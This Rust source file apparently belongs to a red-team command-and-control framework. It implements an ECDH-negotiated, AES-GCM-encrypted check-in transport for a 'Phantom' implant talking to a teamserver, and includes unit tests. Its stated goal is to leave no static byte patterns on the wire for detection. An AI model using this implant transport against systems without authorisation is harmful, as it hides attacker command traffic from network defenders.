//! ECDH-based new-protocol transport for Phantom (replaces Demon wire format).
//!
//! When `listener_pub_key` is present in [`PhantomConfig`], the agent performs
//! an X25519 ECDH handshake on first check-in.  All subsequent traffic is
//! encrypted with the negotiated AES-256-GCM session key.  No plaintext magic,
//! agent ID, or static byte patterns appear on the wire.

pub use red_cell_common::crypto::ecdh::EcdhSession;
use red_cell_common::crypto::ecdh::{AgentTransport, EcdhError};

use crate::error::PhantomError;
use crate::transport::HttpTransport;

impl AgentTransport for HttpTransport {
    async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, String> {
        HttpTransport::send(self, packet).await.map_err(|e| e.to_string())
    }
}

fn map_ecdh(e: EcdhError) -> PhantomError {
    match e {
        EcdhError::InvalidKeyLength => PhantomError::InvalidConfig(
            "listener_pub_key must be exactly 32 bytes (base64-encoded)",
        ),
        other => PhantomError::Transport(other.to_string()),
    }
}

/// Decode a base64-encoded listener public key from config.
///
/// Accepts standard or URL-safe base64, with or without padding.
pub fn decode_listener_pub_key(encoded: &str) -> Result<[u8; 32], PhantomError> {
    red_cell_common::crypto::ecdh::decode_listener_pub_key(encoded).map_err(map_ecdh)
}

/// Perform the ECDH registration handshake with the teamserver.
pub async fn perform_registration(
    transport: &HttpTransport,
    listener_pub_key: &[u8; 32],
    metadata: &[u8],
) -> Result<EcdhSession, PhantomError> {
    red_cell_common::crypto::ecdh::perform_registration(transport, listener_pub_key, metadata)
        .await
        .map_err(map_ecdh)
}

/// Encrypt a check-in payload with the session key and send it.
///
/// Returns the decrypted server response payload.
pub async fn send_session_packet(
    transport: &HttpTransport,
    session: &EcdhSession,
    payload: &[u8],
) -> Result<Vec<u8>, PhantomError> {
    red_cell_common::crypto::ecdh::send_session_packet(transport, session, payload)
        .await
        .map_err(map_ecdh)
}

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::crypto::ecdh::{
        ConnectionId, ListenerKeypair, build_registration_response, open_registration_packet,
        open_session_packet, seal_session_response,
    };

    fn test_keypair() -> ListenerKeypair {
        ListenerKeypair::generate().expect("keypair")
    }

    /// Simulate the full registration handshake without a live HTTP server.
    #[test]
    fn registration_handshake_e2e() {
        let kp = test_keypair();
        let metadata = b"phantom-metadata";

        // Agent side: build registration packet.
        let (packet, agent_session_key) =
            red_cell_common::crypto::ecdh::build_registration_packet(&kp.public_bytes, metadata)
                .expect("build");

        // Teamserver side: open registration.
        let parsed = open_registration_packet(&kp, 300, &packet).expect("open");
        assert_eq!(parsed.session_key, agent_session_key);
        assert_eq!(parsed.metadata, metadata.as_slice());

        // Teamserver side: build response.
        let conn_id = ConnectionId::generate().expect("conn_id");
        let agent_id = 0xDEAD_BEEF_u32;
        let response =
            build_registration_response(&conn_id, &parsed.session_key, agent_id).expect("response");

        // Agent side: parse response.
        let (parsed_conn_id, parsed_agent_id) =
            red_cell_common::crypto::ecdh::parse_registration_response(
                &agent_session_key,
                &response,
            )
            .expect("parse");
        assert_eq!(parsed_conn_id, conn_id);
        assert_eq!(parsed_agent_id, agent_id);
    }

    #[test]
    fn session_packet_e2e() {
        let kp = test_keypair();
        let (_, session_key) =
            red_cell_common::crypto::ecdh::build_registration_packet(&kp.public_bytes, b"meta")
                .expect("build");
        let conn_id = ConnectionId::generate().expect("conn_id");
        let session = EcdhSession { connection_id: conn_id, session_key, agent_id: 1 };

        let payload = b"checkin-data";
        let packet = red_cell_common::crypto::ecdh::seal_session_packet(
            &session.connection_id,
            &session.session_key,
            payload,
        )
        .expect("seal");

        // Teamserver decrypts.
        let decrypted = open_session_packet(&session.session_key, &packet[16..]).expect("open");
        assert_eq!(decrypted, payload);

        // Teamserver builds response.
        let response_payload = b"task-for-agent";
        let sealed_resp =
            seal_session_response(&session.session_key, response_payload).expect("seal resp");

        // Agent decrypts.
        let opened_resp = red_cell_common::crypto::ecdh::open_session_response(
            &session.session_key,
            &sealed_resp,
        )
        .expect("open resp");
        assert_eq!(opened_resp, response_payload);
    }

    #[test]
    fn decode_listener_pub_key_roundtrip() {
        use base64::Engine as _;
        let kp = test_keypair();
        let encoded = base64::engine::general_purpose::STANDARD_NO_PAD.encode(kp.public_bytes);
        let decoded = decode_listener_pub_key(&encoded).expect("decode");
        assert_eq!(decoded, kp.public_bytes);
    }

    #[test]
    fn decode_listener_pub_key_rejects_wrong_length() {
        use base64::Engine as _;
        let short = base64::engine::general_purpose::STANDARD_NO_PAD.encode(b"too-short");
        let result = decode_listener_pub_key(&short);
        assert!(result.is_err());
    }
}
